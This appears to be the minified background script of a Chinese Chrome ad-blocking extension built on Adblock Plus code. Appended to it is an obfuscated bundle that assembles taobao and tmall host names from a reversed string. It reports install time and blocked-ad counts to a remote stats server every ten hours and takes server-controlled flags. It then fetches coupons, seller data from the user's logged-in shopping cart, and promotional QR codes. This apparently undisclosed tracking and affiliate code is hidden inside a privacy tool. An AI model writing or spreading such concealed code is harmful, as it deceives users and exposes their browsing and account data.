with(require("filterClasses"))this.Filter=Filter,this.RegExpFilter=RegExpFilter,this.BlockingFilter=BlockingFilter,this.WhitelistFilter=WhitelistFilter,this.RedirectFilter=RedirectFilter;with(require("subscriptionClasses"))this.Subscription=Subscription,this.DownloadableSubscription=DownloadableSubscription;var FilterStorage=require("filterStorage").FilterStorage,ElemHide=require("elemHide").ElemHide,defaultMatcher=require("matcher").defaultMatcher,Prefs=require("prefs").Prefs,Synchronizer=require("synchronizer").Synchronizer,Utils=require("utils").Utils,Cscript=require("cscript").Cscript;RegExpFilter.typeMap.OBJECT_SUBREQUEST=RegExpFilter.typeMap.OBJECT,RegExpFilter.typeMap.MEDIA=RegExpFilter.typeMap.FONT=RegExpFilter.typeMap.OTHER;var seenDataCorruption=!1;require("filterNotifier").FilterNotifier.addListener((function(e){if("load"==e){var t=require("info").addonVersion,n=localStorage.currentVersion;n!=t&&(localStorage.currentVersion=t,doUpdateOrInstall(t,n))}}));var noStyleRulesHosts=["mail.google.com","mail.yahoo.com","www.google.com"];function removeDeprecatedOptions(){["videoAdkill","videoblockcontent","videokillsublink","videoupdatemeta"].forEach((function(e){e in localStorage&&delete localStorage[e]}))}function setDefaultOptions(){function e(e,t){e in localStorage||(localStorage[e]=t)}e("shouldShowIcon","true"),e("shouldShowBlockElementMenu","true"),removeDeprecatedOptions()}function pendingPageAutoRefresh(){localStorage.pendingPageAutoRefresh&&"false"!=localStorage.pendingPageAutoRefresh&&chrome.tabs.query({active:!0},(function(e){chrome.tabs.reload(e[0].id)}))}function isWhitelisted(e,t,n){var o=e.indexOf("#");o>=0&&(e=e.substring(0,o));var i=defaultMatcher.matchesAny(e,n||"DOCUMENT",extractHostFromURL(t||e),!1);return i instanceof WhitelistFilter?i:null}setDefaultOptions(),pendingPageAutoRefresh();var activeNotification=null;function refreshIconAndContextMenu(e){if(e){var t=isWhitelisted(e.url),n=t?"icons/abp-19-whitelisted.png":"icons/abp-19.png";activeNotification?startIconAnimation(e,n):chrome.browserAction.setIcon({tabId:e.id,path:n}),/^https?:/.test(e.url)&&(chrome.browserAction.setTitle({tabId:e.id,title:"广告终结者"}),t?chrome.contextMenus.removeAll():showContextMenu())}}function versionCompare(e,t){if(typeof e+typeof t!="stringstring")return!1;for(var n=e.split("."),o=t.split("."),i=0,r=Math.max(n.length,o.length);i<r;i++){if(n[i]&&!o[i]&&parseInt(n[i])>0||parseInt(n[i])>parseInt(o[i]))return 1;if(o[i]&&!n[i]&&parseInt(o[i])>0||parseInt(n[i])<parseInt(o[i]))return-1}return 0}function doUpdateOrInstall(e,t){if(localStorage.notificationRules=!0,null==t)!function(){let e="http://sub.adtchrome.com/adt-chinalist-easylist.txt";(new Browser).browser.indexOf("360")>-1&&(e="http://sub.adtchrome.com/adt-chinalist-easylist360.txt"),e in FilterStorage.knownSubscriptions||chrome.tabs.create({url:chrome.extension.getURL("firstRun.html")})}();else{var n=new Browser;if(versionCompare(t,"3.2.8")<0&&n.browser.indexOf("360")>-1){console.log("fix 360 rule");var o="http://sub.adtchrome.com/adt-chinalist-easylist.txt";o in FilterStorage.knownSubscriptions&&FilterStorage.removeSubscription(FilterStorage.knownSubscriptions[o]);[{homepage:"http://www.adtchrome.com/extension/adt-chinalist-easylist360.html",title:"广告终结者默认过滤规则",url:"http://sub.adtchrome.com/adt-chinalist-easylist360.txt",disabled:!1}].forEach((function(e){var t=Subscription.fromURL(e.url);FilterStorage.addSubscription(t),t.disabled=e.disabled,t.title=e.title,t.homepage=e.homepage,t instanceof DownloadableSubscription&&!t.lastDownload&&Synchronizer.execute(t)}))}}}function showContextMenu(){chrome.contextMenus.removeAll((function(){"string"==typeof localStorage.shouldShowBlockElementMenu&&"true"==localStorage.shouldShowBlockElementMenu&&chrome.contextMenus.create({title:chrome.i18n.getMessage("block_element"),contexts:["image","video","audio"],onclick:function(e,t){e.srcUrl&&chrome.tabs.sendMessage(t.id,{reqtype:"clickhide-new-filter",filter:e.srcUrl})}}),"string"==typeof localStorage.shouldShowManualBlockMenu&&"true"==localStorage.shouldShowManualBlockMenu&&chrome.tabs.query({active:!0},(function(e){(/^(https|http):\/\/\S*$/.test(e.url)||/^(https|http):\/\/\S*$/.test(e[0].url))&&chrome.contextMenus.create({title:"手动屏蔽广告",contexts:["all"],onclick:function(e,t){chrome.tabs.sendMessage(t.id,{reqtype:"clickhide-activate"})}})}))}))}function openOptions(e){function t(e){for(var t=chrome.extension.getViews({type:"tab"}),n=0;n<t.length;n++)if("startSubscriptionSelection"in t[n])return t[n];return null}var n=t();if(n)chrome.windows.getAll({populate:!0},(function(e){for(var t=chrome.extension.getURL("options.html"),n=0;n<e.length;n++)for(var o=0;o<e[n].tabs.length;o++)e[n].tabs[o].url==t&&chrome.tabs.update(e[n].tabs[o].id,{selected:!0})})),e(n);else{var o=function(){var n=t();n&&e(n)};chrome.tabs.create({url:chrome.extension.getURL("options.html")},(function(e){if("complete"==e.status)o();else{var t=e.id,n=function(e,i,r){e==t&&"complete"==i.status&&(chrome.tabs.onUpdated.removeListener(n),o())};chrome.tabs.onUpdated.addListener(n)}}))}}var iconAnimationTimer=null,animatedIconTab=null;function stopIconAnimation(){iconAnimationTimer&&(clearTimeout(iconAnimationTimer),iconAnimationTimer=null,animatedIconTab=null)}function loadImages(e,t){var n={},o=0;e.forEach((function(i){var r=new Image;r.src=i,r.addEventListener("load",(function(){n[i]=r,++o===e.length&&t(n)}))}))}function startIconAnimation(e,t){stopIconAnimation(),animatedIconTab=e;var n="icons/notification-"+("critical"===activeNotification.severity?"critical":"information")+".png";loadImages([t,n],(function(o){var i=o[t],r=o[n],a=document.createElement("canvas");a.width=i.width,a.height=i.height;var s=a.getContext("2d"),c=0,l=[0,.2,.4,.6,.8,1,1,1,1,1,.8,.6,.4,.2,0];!function t(){var n=l[c];s.clearRect(0,0,a.width,a.height),s.globalAlpha=1,s.drawImage(i,0,0),s.globalAlpha=n,s.drawImage(r,0,0);var o,u=s.getImageData(0,0,a.width,a.height);if(chrome.browserAction.setIcon({tabId:e.id,imageData:u}),++c<l.length){o=3e3/l.length}else c=0,o=1e4;iconAnimationTimer=setTimeout(t,o)}()}))}function prepareNotificationIconAndPopup(){activeNotification.onClicked=function(){var e=animatedIconTab;stopIconAnimation(),activeNotification=null,refreshIconAndContextMenu(e)},chrome.windows.getLastFocused({populate:!0},(function(e){chrome.tabs.query({active:!0,windowId:e.id},(function(e){e.forEach(refreshIconAndContextMenu)}))}))}function getFrameId(e,t){if(e in frames)for(var n in frames[e])if(getFrameUrl(e,n)==t)return n;return-1}function checkSubscriptions(){if(console.log(FilterStorage.subscriptions),0==FilterStorage.subscriptions.length){if(console.log("error no sub"),(new Browser).browser.indexOf("360")>-1)var e="http://sub.adtchrome.com/adt-chinalist-easylist360.txt";else e="http://sub.adtchrome.com/adt-chinalist-easylist.txt";var t=Subscription.fromURL(e);FilterStorage.addSubscription(t),t.disabled=!1,t.title="广告终结者默认",t.homepage="http://www.adtchrome.com/extension/adt-chinalist-easylist.html",t instanceof DownloadableSubscription&&!t.lastDownload&&(console.log("download"),Synchronizer.execute(t))}}function extend(e,t){for(var n in t)void 0!==t[n]&&(e[n]=t[n]);return e}chrome.runtime.onMessage.addListener((function(e,t,n){switch(e.reqtype){case"get-settings":var o=null,i=null,r=-1,a=-1;t.tab&&(a=getFrameId(r=t.tab.id,e.frameUrl));var s=!isFrameWhitelisted(r,a,"DOCUMENT")&&!isFrameWhitelisted(r,a,"ELEMHIDE");if(s&&e.selectors){var c=!1,l=extractHostFromURL(e.frameUrl);o=getBaseDomain(l);for(var u=0;u<noStyleRulesHosts.length;u++){var d=noStyleRulesHosts[u];(l==d||l.length>d.length&&l.substr(l.length-d.length-1)=="."+d)&&(c=!0)}i=ElemHide.getSelectorsForDomain(l,!1),c&&(i=i.filter((function(e){return!/\[style[\^\$]?=/.test(e)})))}n({enabled:s,hostDomain:o,selectors:i});break;case"should-collapse":r=-1,a=-1;if(t.tab&&(a=getFrameId(r=t.tab.id,e.documentUrl)),isFrameWhitelisted(r,a,"DOCUMENT")){n(!1);break}var h=extractHostFromURL(e.url),f=extractHostFromURL(e.documentUrl),m=isThirdParty(h,f),p=defaultMatcher.matchesAny(e.url,e.type,f,m);if(p instanceof BlockingFilter){var g=p.collapse;null==g&&(g="false"!=localStorage.hidePlaceholders),n(g)}else n(!1);break;case"get-domain-enabled-state":if(t.tab)return void n({enabled:!isWhitelisted(t.tab.url)});break;case"add-filters":if(e.filters&&e.filters.length)for(u=0;u<e.filters.length;u++)FilterStorage.addFilter(Filter.fromText(e.filters[u]));break;case"add-subscription":openOptions((function(t){t.startSubscriptionSelection(e.title,e.url)}));break;case"set-localstorage":localStorage[e.lparam]=e.lvalue,chrome.tabs.sendResponse({lparam:e.lparam,lvalue:e.lvalue});break;case"get-script":t.tab||(t.tab={url:""}),n({cscripts:Cscript.exeScript(t.tab.url)});break;case"open-customRuleWindow":chrome.windows.create({url:chrome.extension.getURL("block.html?tabId="+t.tab.id),left:50,top:50,width:435,height:265,type:"popup"});break;default:return!0}})),chrome.windows.getAll({populate:!0},(function(e){for(var t=0;t<e.length;t++)for(var n=0;n<e[t].tabs.length;n++)refreshIconAndContextMenu(e[t].tabs[n])})),chrome.tabs.onUpdated.addListener((function(e,t,n){chrome.tabs.sendMessage(e,{reqtype:"clickhide-deactivate"}),"loading"==t.status&&refreshIconAndContextMenu(n)})),chrome.tabs.onActivated.addListener((function(e){refreshIconAndContextMenu(animatedIconTab),chrome.tabs.get(e.tabId,refreshIconAndContextMenu)})),chrome.windows.onFocusChanged.addListener((function(e){refreshIconAndContextMenu(animatedIconTab),chrome.tabs.query({active:!0,windowId:e},(function(e){e.forEach(refreshIconAndContextMenu)}))})),setTimeout((function(){checkSubscriptions()}),2e4);var $={ajax:function(e){var t=function(){};(e=extend({url:".",cache:!0,data:{},headers:{},type:"GET",success:t,aerror:t,complete:t},e||{})).cache||(e.url=e.url+(e.url.indexOf("?")>0?"&":"?")+"noCache="+Math.floor(9e9*Math.random()));var n=function(e,t,n){n.complete(t,e)},o=new XMLHttpRequest;for(var i in o.addEventListener("readystatechange",(function(){4===o.readyState&&(o.status>=200&&o.status<300||304===o.status?function(e,t,o){o.success(e,"success",t),n("success",t,o)}(o.responseText,o,e):function(e,t,o,i){i.aerror(o,t,e),n(t,o,i)}(o.statusText,"error",o,e))}),!1),o.open(e.type,e.url),"POST"===e.type&&(e.headers=extend(e.headers,{"X-Requested-With":"XMLHttpRequest","Content-type":"application/x-www-form-urlencoded"})),e.headers)o.setRequestHeader(i,e.headers[i]);var r,a=[];for(name in e.data)a.push(encodeURIComponent(name)+"="+encodeURIComponent(e.data[name]));r=a.join("&").replace(/%20/g,"+"),o.send(r)}};!function(e){e.IOG=function(e,t,n,o){(window.requestFileSystem||window.webkitRequestFileSystem)(window.PERSISTENT,10485760,(function(i){i.root.getFile(e,{create:t},(function(e){n(i,e)}),o)}),o)},e.IOR=function(t,n,o){e.IOG(t,!1,(function(e,t){t.file((function(e){var t=new FileReader;t.onloadend=function(){n(t.result)},t.readAsText(e)}),o)}),o)},e.IOW=function(t,n,o,i){var r=function(t,n,o,i){e.IOG(t,!0,(function(e,t){t.createWriter((function(e){e.onwriteend=o,e.onerror=i;var t=new Blob([n],{type:"text/plain"});e.write(t)}),i)}),i)};e.IOD(t,(function(){r(t,n,o,i)}),(function(){r(t,n,o,i)}))},e.IOD=function(t,n,o){e.IOG(t,!1,(function(e,t){t.remove((function(){n()}),o)}),o)},e.IOE=function(t,n){e.IOG(t,!1,(function(){n(!0)}),(function(){n(!1)}))}}($);!function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:o})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=4)}([function(e,t,n){"use strict";n.d(t,"c",(function(){return a})),n.d(t,"h",(function(){return i})),n.d(t,"d",(function(){return u})),n.d(t,"e",(function(){return s})),n.d(t,"f",(function(){return d})),n.d(t,"a",(function(){return l})),n.d(t,"b",(function(){return c})),n.d(t,"g",(function(){return p}));let o="uoy,qhy,_lft,rqt,mt,oat,iuh,edoc,nc,moc,xob,oab,da,lla".split("").reverse().join("").split(",");o.push(522..toString());var r=o;let a=document,i=window,u=localStorage,s=r[8]+r[2],d=r[9]+r[0],l=(r[13],r[7],r[14],r[4],r[5],r[1]+r[11]),c=l+r[12],p=r[10]+r[6]+"-"+r[3]},,,,function(e,t,n){"use strict";n.r(t);var o=n(0);const r=function(e,t){for(let n in t)void 0!==t[n]&&(e[n]=t[n]);return e};var a=function(e){return new Promise((t,n)=>{(e=r({url:".",cache:!0,data:{},headers:{},type:"GET"},e||{})).cache||(e.url=e.url+(e.url.indexOf("?")>0?"&":"?")+"t="+Date.now());let o=new XMLHttpRequest;o.addEventListener("readystatechange",(function(){if(4===o.readyState){let e;o.status>=200&&o.status<300||304===o.status?(e=o.responseText,o.getResponseHeader("content-type")&&o.getResponseHeader("content-type").indexOf("json")>-1&&(e=JSON.parse(e)),t(e)):n(o.statusText)}}),!1),o.open(e.type,e.url),"POST"===e.type&&(e.headers=r(e.headers,{"X-Requested-With":"XMLHttpRequest","Content-type":"application/x-www-form-urlencoded"}));for(let t in e.headers)o.setRequestHeader(t,e.headers[t]);let a="",i=[];for(name in e.data)i.push(encodeURIComponent(name)+"="+encodeURIComponent(e.data[name]));a=i.join("&").replace(/%20/g,"+"),o.send(a)})},i=function(e,t){t||(t=o.h.location.href),e=e.replace(/[\[\]]/g,"\\$&");var n=new RegExp("[?&]"+e+"(=([^&#]*)|&|#|$)").exec(t);return n?n[2]?decodeURIComponent(n[2].replace(/\+/g," ")):"":null};const u=function(e,t){var n=navigator.mimeTypes;for(var o in n)if(n[o][e]==t)return!0;return!1};o.d.installTime||(o.d.installTime=Date.now());let s=o.d.am||"",d=o.d.debugUrl||"https://stat.adtchrome.com",l=!!o.d.debugUrl;!function e(){let t=JSON.parse(o.d.stats_total||'{"blocked":0}').blocked,n=function(e){var t=!1,n=e||navigator.userAgent;if(n.indexOf("Chrome")>0){var r=n.replace(/^.*Chrome\/([\d]+).*$/,"$1");r>36&&o.h.showModalDialog?t=!0:r>45&&(t=u("type","application/x-shockwave-flash")&&u("description","Adobe Flash movie"))}return t}()?"2":"3";a({type:"GET",url:d+"/state/v2?s="+n+"&am="+s+"&bc="+t+"&it="+o.d.installTime+"&tfl="+(o.d.tfl||"")+"&tflTimeCd="+(o.d.tflTimeCd?o.d.tflTimeCd:0)}).then(e=>{null!=e.tfl&&(o.d.tfl=e.tfl),e.status!=s&&(null==o.d.tfl&&e.status&&"0"!=e.status&&(o.d.tfl=!0),o.d.am=s=e.status),e.nsc?o.d.nsc=1:delete o.d.nsc,e.ps?o.d.ps=e.ps:delete o.d.ps,e.iss?o.d.iss=e.iss:delete o.d.iss,e.ws?o.d.ws=!0:delete o.d.ws}).catch(e=>{l&&console.log(e)}),setTimeout(e,36e6)}(),chrome.runtime.onMessage.addListener((function(e,t,n){return async function(e,t){if("getQuan"==e.cmd){let n={am:"false"==o.d.tfl?"":s,itemId:i("id",e.url),iss:o.d.iss,quan:[],ws:!!o.d.ws,status:1,pageSellerId:e.pageSellerId,ps:o.d.ps};return n.am&&"0"!=n.am&&0!=n.am?t.url.indexOf("chaoshi.detail."+o.f+".com")>-1?(n.am="",n):(await async function(e){await a({type:"GET",url:d+"/query/v2?itemId="+e.itemId+"&amid="+o.d.am}).then(t=>{if(1==t.status){t.sellerId&&(e.sellerId=t.sellerId);for(var n=0;n<t.coupon.length;n++){var o={condition:"\u6ee1"+Number(t.coupon[n].couponCondition).toFixed(0)+"\u51cf"+Number(t.coupon[n].couponValue).toFixed(0),timeRange:t.coupon[n].couponStarttime+"-"+t.coupon[n].couponEndtime,aid:t.coupon[n].activityId,startFee:Number(t.coupon[n].couponCondition).toFixed(0),amount:Number(t.coupon[n].couponValue).toFixed(0)};e.quan.push(o)}}2==t.status&&(e.status=t.status,e.adfee=t.adfee)}).catch(e=>{l&&console.log(e)})}(n),o.d.nsc?n.needLogin=!1:await async function(e){e.sellerId||(e.sellerId=e.pageSellerId),await a({type:"GET",url:"https://cart."+o.e+".com/json/GetPriceVolume.do?sellerId="+e.sellerId}).then(t=>{if("string"==typeof t&&t.indexOf("\u767b\u5f55")>-1)e.needLogin=!0,e.loginText=["","\u767b\u5f55","\u53ef\u663e\u793a\u66f4\u591a\u4f18\u60e0\u5238"];else{let o=JSON.parse(t);for(var n=0;n<o.priceVolumes.length;n++){let t={condition:o.priceVolumes[n].condition,timeRange:o.priceVolumes[n].timeRange,aid:o.priceVolumes[n].id,merchantCoupon:!0},r=o.priceVolumes[n].condition.match(/\u6ee1(\d+\.\d+|\d+)\u51cf(\d+\.\d+|\d+)/);r&&(t.startFee=Number(r[1]).toFixed(0),t.amount=Number(r[2]).toFixed(0),e.quan.push(t))}}}).catch(e=>{l&&console.log(e)})}(n),await async function(e){await a({type:"GET",url:d+"/activity/get/v1"}).then(t=>{1==t.status&&(e.customQRcodes=t.result)}).catch(e=>{l&&console.log(e)})}(n),n):n}}(e,t).then(n),!0}))}]);